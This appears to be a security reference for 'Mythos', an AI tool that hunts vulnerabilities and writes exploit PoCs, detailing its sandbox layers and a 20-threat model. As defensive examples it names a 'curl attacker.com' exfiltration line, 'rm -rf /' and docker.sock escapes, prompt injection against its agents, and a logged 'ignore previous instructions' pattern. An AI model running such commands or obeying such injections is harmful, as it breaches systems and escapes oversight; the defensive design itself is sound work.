# Mythos Preview — Security Reference

This document expands the 20-threat threat model from the design spec into a per-threat operational reference.

## Mythos as an offensive tool

Mythos produces working exploit code. Use is permitted only on:

1. Code you own
2. Code in scope of an authorized bug bounty
3. Code under signed pen-test engagement
4. Code in authorized security research

Unauthorized use is illegal in most jurisdictions.

## Defense-in-depth layers (sandbox)

When a hunter executes a PoC, the container is constrained by 9 stacked layers:

1. `cap_drop=ALL` — zero Linux capabilities
2. `no-new-privileges=true` — no SUID escalation
3. Custom seccomp profile — ~190 syscalls whitelisted, mount/ptrace/bpf/etc. denied
4. AppArmor profile (Linux only) — additional path/syscall denial
5. `read_only=True` — root filesystem immutable
6. `user=1000:1000` — non-root execution
7. `network_mode=none` — zero outbound network by default
8. Resource limits — pids 100, mem 512m, cpu 1, nofile 256, nproc 200
9. `cgroupns=private` — cgroup namespace isolation

All 9 layers are validated by the red-team test suite (6 escape attempts, all blocked).

## Threat model — 20 threats

### T1 — Container escape (sandbox)
**Vector:** PoC code exploits a Docker CVE to break out of the container.
**Mitigations:** All 9 sandbox layers above. Pinned base image. Quarterly review of Docker CVE alerts.
**Validation:** `tests/red_team/test_sandbox_resists_escape.py::test_setuid_zero_is_denied` + `test_mount_syscall_blocked`.

### T2 — Data exfiltration via PoC
**Vector:** PoC code executes `curl attacker.com` to leak secrets.
**Mitigation:** `network_mode=none` by default. For OAST callbacks, an isolated `mythos-<run>-net` network is used (no Internet egress).
**Validation:** `test_network_egress_blocked`.

### T3 — Fork bomb / local DoS
**Vector:** PoC spawns infinite processes.
**Mitigation:** `pids_limit=100` + `--memory=512m` + `ulimit nproc=200`.
**Validation:** `test_fork_bomb_is_contained`.

### T4 — Path traversal by hunter
**Vector:** Hunter writes to a path outside its allowed directories.
**Mitigation:** PostToolUse hook `validate_write.py` enforces regex-based path allowlists per agent.
**Validation:** `tests/unit/test_validate_write.py::TestPathTraversal`.

### T5 — Prompt injection via target source
**Vector:** Malicious comment in target code instructs the AI to ignore previous prompts.
**Mitigation:** Every agent prompt contains a TRUST BOUNDARY section. Validation tests ensure presence.
**Validation:** `test_trust_boundary_in_body` in worker + lead definition tests.

### T6 — Secret leakage in findings
**Vector:** Hunter logs an AWS key from `.env` into `findings.jsonl`.
**Mitigation:** `redact.py` patterns + `validate_write.py` warn-on-secret detection.
**Validation:** `tests/unit/test_redact.py` + `test_validate_write.py::TestSecretLeakage`.

### T7 — Sandbox bypass via Docker socket
**Vector:** Hunter mounts `/var/run/docker.sock` to gain host control.
**Mitigation:** PreToolUse hook `validate_bash.py` blocks any command referencing `docker.sock`.
**Validation:** `test_docker_socket_not_accessible`.

### T8 — Validate collusion
**Vector:** A trojan PoC fools the hunter, and the validator replays it without scrutiny.
**Mitigation:** `mythos-validate` generates an INDEPENDENT PoC and only keeps findings where both reproduce. Validate has no `Agent` tool.
**Validation:** `test_validate_lead_does_not_have_agent_tool` + the validate prompt explicitly forbids replay-only verdicts.

### T9 — Output injection (ANSI/control chars)
**Vector:** PoC stdout contains escape sequences that pollute terminals or break log parsers.
**Mitigation:** `sanitize_output.py` strips ANSI + control chars + caps at 1MB.
**Validation:** `tests/unit/test_sanitize_output.py`.

### T10 — Malicious cyber skill
**Vector:** A compromised skill in the source library contains adversarial instructions.
**Mitigation:** Skill content is audited by `install_skills.py` (regex patterns for script tags, prompt injection language) before install. Whitelist (`allowed-skills.txt`) enforced.
**Validation:** `tests/unit/test_install_skills.py::TestAuditSkill`.

### T11 — State tampering between runs
**Vector:** Operator (or malware) edits `.mythos/run.json` to resume from a different state.
**Mitigation:** Hash chain (SHA-256 over all `.mythos/` contents except snapshots/) refreshed at each phase. `/mythos resume` rejects mismatches.
**Validation:** `tests/unit/test_snapshot_run.py::test_compute_hash_chain`.

### T12 — Concurrent run collision
**Vector:** Two operators run Mythos simultaneously; containers / networks collide.
**Mitigation:** Per-run isolation: container name `mythos-<run>-<hunter>-<finding>`; per-run network `mythos-<run>-net`.

### T13 — Catastrophic rm/chmod
**Vector:** A hunter jailbreak / confusion triggers `rm -rf /` or `chmod 777 /`.
**Mitigation:** PreToolUse `validate_bash.py` blocks 18+ catastrophic patterns. `settings.json` `permissions.deny` is a second wall.
**Validation:** 22 parametrized dangerous-command tests in `test_validate_bash.py`.

### T14 — Disk fill
**Vector:** PoC artifacts grow unbounded.
**Mitigation:** `/mythos clean` purges; auto-compress `poc/` after Report; sandbox tmpfs caps at 50MB.

### T15 — Anthropic rate limit
**Vector:** 50 parallel hunters hammering the API.
**Mitigation:** Exponential backoff in `launch_hunters.py` on 429/529. Dynamic batch-size reduction.

### T16 — Orphaned processes after crash
**Vector:** Session terminates; 50 hunter subprocesses + containers persist.
**Mitigation:** Stop hook in `settings.json` triggers `cleanup_orphans.py`. Heartbeat detection (planned for v1.1).

### T17 — Dual-use abuse
**Vector:** Operator uses Mythos against code they're not authorized to test.
**Mitigation:** First-run `disclaimer.py --accept` required. Disclaimer text references criminal/civil liability.

### T18 — Indirect injection via PoC log
**Vector:** Hunter's PoC log contains injected text that tries to fool Validate.
**Mitigation:** Validate reads source code FIRST (before looking at the hunter's PoC). Forms independent opinion.

### T19 — Symbol index poisoning
**Vector:** Malicious file in target poisons the ctags output.
**Mitigation:** ctags runs with `--exclude` patterns; results pre-validated before injection into tracer prompts.

### T20 — Resume with tampered snapshot
**Vector:** External modification of a snapshot tar.gz before `/mythos resume`.
**Mitigation:** Hash chain check at restore; snapshots checksummed by their tar manifest.
**Validation:** `tests/unit/test_snapshot_run.py::TestSnapshotAndRestore`.

## Audit log (.mythos/audit.jsonl)

The audit log is append-only and survives `/mythos clean` (unless `--all` is passed with confirmation). Every security-relevant event is logged:

```jsonl
{"ts":"...","level":"security","event":"sandbox_kill","reason":"network_egress_attempt","container":"mythos-r1-h07","finding_id":"F-042"}
{"ts":"...","level":"security","event":"path_traversal_blocked","agent":"mythos-hunter","path":"poc/../../etc/passwd"}
{"ts":"...","level":"security","event":"prompt_injection_detected","agent":"mythos-hunter","file":"src/handler.py","pattern":"ignore previous instructions"}
```

## Responsible disclosure

If you discover a vulnerability IN Mythos itself (in the sandbox, the orchestrator, or the schemas), please report it privately to the maintainer rather than filing a public issue. Critical issues (sandbox escape, secret leakage path) should be remediated within 7 days.
